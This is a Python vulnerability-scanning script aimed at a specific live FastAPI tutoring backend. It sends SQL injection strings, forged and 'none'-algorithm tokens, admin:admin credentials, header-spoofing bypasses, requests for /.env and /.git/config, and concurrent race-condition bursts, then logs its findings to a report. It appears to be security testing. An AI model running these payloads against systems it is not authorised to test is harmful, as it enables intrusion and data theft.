import requests
import json
import time
from datetime import datetime
import concurrent.futures

print("="*60)
print("COMPREHENSIVE VULNERABILITY SCAN")
print("="*60)

backend_url = "https://fastapi-tutor-app-backend-208251878692.asia-south1.run.app"

# Track all findings
findings = []

def test_endpoint(method, endpoint, data=None, headers=None, timeout=3):
    """Test endpoint with proper error handling"""
    try:
        if method == "GET":
            response = requests.get(backend_url + endpoint, headers=headers, timeout=timeout)
        elif method == "POST":
            response = requests.post(backend_url + endpoint, json=data, headers=headers, timeout=timeout)
        return response
    except requests.exceptions.Timeout:
        findings.append({
            "severity": "HIGH",
            "type": "DoS - Timeout",
            "endpoint": endpoint,
            "description": f"Endpoint hangs/times out - potential DoS vulnerability"
        })
        return None
    except Exception as e:
        return None

print("\n[1] TESTING DENIAL OF SERVICE VULNERABILITIES")
print("-"*60)

# Test quiz endpoint with various payloads
dos_payloads = [
    {"name": "Normal payload", "data": {"answers": {"1": "A", "2": "B", "3": "C"}}},
    {"name": "Empty payload", "data": {}},
    {"name": "Null values", "data": {"answers": None}},
    {"name": "Large payload", "data": {"answers": {str(i): "A" for i in range(1000)}}},
    {"name": "Deeply nested", "data": {"a": {"b": {"c": {"d": {"e": {"f": "test"}}}}}}},
    {"name": "Special characters", "data": {"answers": {"1": "';DROP TABLE--"}}},
    {"name": "Unicode", "data": {"answers": {"1": "🔥💀🎯"}}},
]

for payload in dos_payloads:
    print(f"\nTesting: {payload['name']}")
    start = time.time()
    response = test_endpoint("POST", "/quiz1/", payload['data'], timeout=5)
    elapsed = time.time() - start
    
    if response is None:
        print(f"  ❌ TIMEOUT/ERROR after {elapsed:.2f}s")
    elif response.status_code == 200:
        print(f"  ⚠️  Accepted invalid data (Status: {response.status_code})")
        findings.append({
            "severity": "HIGH",
            "type": "Input Validation",
            "endpoint": "/quiz1/",
            "description": f"Accepts {payload['name']}"
        })
    else:
        print(f"  Status: {response.status_code} (Time: {elapsed:.2f}s)")

print("\n[2] TESTING AUTHENTICATION BYPASS IN DETAIL")
print("-"*60)

# More sophisticated auth bypass attempts
auth_bypasses = [
    {"Authorization": "Bearer null"},
    {"Authorization": "Bearer undefined"},
    {"Authorization": "Bearer "},
    {"Authorization": "Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9."},  # None algorithm
    {"Authorization": "Basic YWRtaW46YWRtaW4="},  # Basic auth admin:admin
    {"Cookie": "session=admin"},
    {"X-User-Id": "1"},
    {"X-Admin": "true"},
    {"X-Forwarded-For": "127.0.0.1"},
]

protected_endpoints = [
    "/api/user",
    "/dashboard/math/algebra/",
    "/revise/stats",
    "/math/algebra/basics/quiz/",
    "/math/algebra/basics/practise/",
]

for endpoint in protected_endpoints:
    print(f"\nTesting: {endpoint}")
    
    # First test without any auth
    response = test_endpoint("GET", endpoint)
    if response and response.status_code == 200:
        print(f"  ❌ NO AUTH REQUIRED!")
        findings.append({
            "severity": "CRITICAL",
            "type": "No Authentication",
            "endpoint": endpoint,
            "description": "Endpoint accessible without any authentication"
        })
        continue
    
    # Test various bypass techniques
    for headers in auth_bypasses:
        response = test_endpoint("GET", endpoint, headers=headers)
        if response and response.status_code == 200:
            print(f"  ❌ BYPASS with: {headers}")
            findings.append({
                "severity": "CRITICAL",
                "type": "Auth Bypass",
                "endpoint": endpoint,
                "description": f"Bypassed with headers: {headers}"
            })
            break

print("\n[3] TESTING INJECTION VULNERABILITIES")
print("-"*60)

# SQL Injection with time-based detection
sql_endpoints = [
    ("/select/", "POST", {"subject": "math' AND SLEEP(3)--", "topic": "test"}),
    ("/login", "POST", {"username": "admin'--", "password": "test"}),
    ("/api/user", "GET", {"id": "1 OR 1=1"}),
    ("/subjects/", "GET", {"filter": "' UNION SELECT * FROM users--"}),
]

for endpoint, method, data in sql_endpoints:
    print(f"\nTesting SQL injection on {endpoint}")
    
    # Normal request timing
    start = time.time()
    if method == "GET":
        normal_response = test_endpoint(method, endpoint, headers={"params": {"id": "1"}})
    else:
        normal_response = test_endpoint(method, endpoint, {"subject": "math", "topic": "test"})
    normal_time = time.time() - start
    
    # SQL injection timing
    start = time.time()
    if method == "GET":
        response = test_endpoint(method, endpoint + f"?{list(data.keys())[0]}={list(data.values())[0]}")
    else:
        response = test_endpoint(method, endpoint, data)
    injection_time = time.time() - start
    
    # Time-based detection
    if injection_time > normal_time + 2:
        print(f"  ❌ TIME-BASED SQL INJECTION DETECTED!")
        print(f"  Normal: {normal_time:.2f}s, Injection: {injection_time:.2f}s")
        findings.append({
            "severity": "CRITICAL",
            "type": "SQL Injection",
            "endpoint": endpoint,
            "description": "Time-based SQL injection vulnerability"
        })
    
    # Error-based detection
    if response and any(err in response.text.lower() for err in ["syntax", "sql", "query", "database"]):
        print(f"  ❌ ERROR-BASED SQL INJECTION!")
        findings.append({
            "severity": "CRITICAL",
            "type": "SQL Injection",
            "endpoint": endpoint,
            "description": "Error-based SQL injection vulnerability"
        })

print("\n[4] TESTING BUSINESS LOGIC FLAWS")
print("-"*60)

# Business logic tests
logic_tests = [
    {
        "name": "Quiz without selection",
        "endpoint": "/quiz1/",
        "data": {"answers": {"1": "A"}},
        "description": "Taking quiz without selecting subject/topic"
    },
    {
        "name": "Direct revision access",
        "endpoint": "/revise/",
        "data": {"subject": "math", "topic": "algebra"},
        "description": "Accessing revision without completing quiz"
    },
    {
        "name": "Score manipulation",
        "endpoint": "/dashboard/math/algebra/",
        "data": {"score": 100, "override": True},
        "description": "Attempting to override dashboard scores"
    },
    {
        "name": "Multiple simultaneous quizzes",
        "endpoint": "/math/algebra/basics/quiz/",
        "data": {"session": "new"},
        "description": "Starting multiple quiz sessions"
    },
]

for test in logic_tests:
    print(f"\nTesting: {test['name']}")
    response = test_endpoint("POST", test['endpoint'], test['data'])
    
    if response and response.status_code in [200, 201]:
        print(f"  ❌ LOGIC FLAW: {test['description']}")
        findings.append({
            "severity": "HIGH",
            "type": "Business Logic",
            "endpoint": test['endpoint'],
            "description": test['description']
        })

print("\n[5] TESTING INFORMATION DISCLOSURE")
print("-"*60)

# Check for sensitive information
info_endpoints = [
    "/.git/config",
    "/.env",
    "/config.json",
    "/api/config",
    "/api/debug",
    "/metrics",
    "/health/detailed",
    "/api/logs",
    "/api/errors",
    "/__pycache__/",
    "/backup/",
    "/api/v1/",  # Old API version
    "/test/",
    "/admin/",
]

for endpoint in info_endpoints:
    response = test_endpoint("GET", endpoint)
    if response and response.status_code not in [404, 403]:
        print(f"  ❌ EXPOSED: {endpoint} (Status: {response.status_code})")
        findings.append({
            "severity": "HIGH",
            "type": "Information Disclosure",
            "endpoint": endpoint,
            "description": f"Sensitive endpoint exposed"
        })

print("\n[6] TESTING RACE CONDITIONS")
print("-"*60)

def race_test(endpoint, data):
    """Perform race condition test"""
    results = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(requests.post, backend_url + endpoint, json=data, timeout=5) for _ in range(10)]
        for future in concurrent.futures.as_completed(futures):
            try:
                response = future.result()
                results.append(response.status_code)
            except:
                results.append("error")
    return results

# Test race conditions
race_endpoints = [
    ("/quiz1/", {"answers": {"1": "A"}}),
    ("/select/", {"subject": "math", "topic": "algebra"}),
    ("/logout", {}),
]

for endpoint, data in race_endpoints:
    print(f"\nTesting race condition on {endpoint}")
    results = race_test(endpoint, data)
    success_count = results.count(200) + results.count(201)
    
    if success_count > 1:
        print(f"  ❌ RACE CONDITION: {success_count}/10 succeeded")
        findings.append({
            "severity": "MEDIUM",
            "type": "Race Condition",
            "endpoint": endpoint,
            "description": f"{success_count} concurrent requests succeeded"
        })

print("\n[7] TESTING CORS AND HEADERS")
print("-"*60)

# Test CORS
cors_test = test_endpoint("OPTIONS", "/api/user", headers={"Origin": "https://evil.com"})
if cors_test and "access-control-allow-origin" in cors_test.headers:
    allowed = cors_test.headers["access-control-allow-origin"]
    if allowed == "*" or "evil.com" in allowed:
        print(f"  ❌ CORS MISCONFIGURATION: Allows {allowed}")
        findings.append({
            "severity": "HIGH",
            "type": "CORS",
            "endpoint": "/api/user",
            "description": f"CORS allows: {allowed}"
        })

# Check security headers
response = test_endpoint("GET", "/")
if response:
    missing_headers = []
    security_headers = [
        "X-Frame-Options",
        "X-Content-Type-Options",
        "X-XSS-Protection",
        "Strict-Transport-Security",
        "Content-Security-Policy",
    ]
    
    for header in security_headers:
        if header not in response.headers:
            missing_headers.append(header)
    
    if missing_headers:
        print(f"  ❌ MISSING SECURITY HEADERS: {', '.join(missing_headers)}")
        findings.append({
            "severity": "MEDIUM",
            "type": "Security Headers",
            "endpoint": "/",
            "description": f"Missing: {', '.join(missing_headers)}"
        })

# FINAL REPORT
print("\n" + "="*60)
print("VULNERABILITY SUMMARY")
print("="*60)

# Count by severity
severity_count = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0}
for finding in findings:
    severity_count[finding["severity"]] += 1

print(f"\nTotal vulnerabilities found: {len(findings)}")
for severity, count in severity_count.items():
    if count > 0:
        print(f"  {severity}: {count}")

print("\nMOST CRITICAL ISSUES:")
critical_findings = [f for f in findings if f["severity"] == "CRITICAL"]
for finding in critical_findings[:5]:
    print(f"\n❌ {finding['type']}: {finding['endpoint']}")
    print(f"   {finding['description']}")

# Save detailed report
with open("vulnerability_report.json", "w") as f:
    json.dump({
        "scan_date": datetime.now().isoformat(),
        "total_vulnerabilities": len(findings),
        "findings": findings
    }, f, indent=2)

print(f"\n✓ Detailed report saved to: vulnerability_report.json")
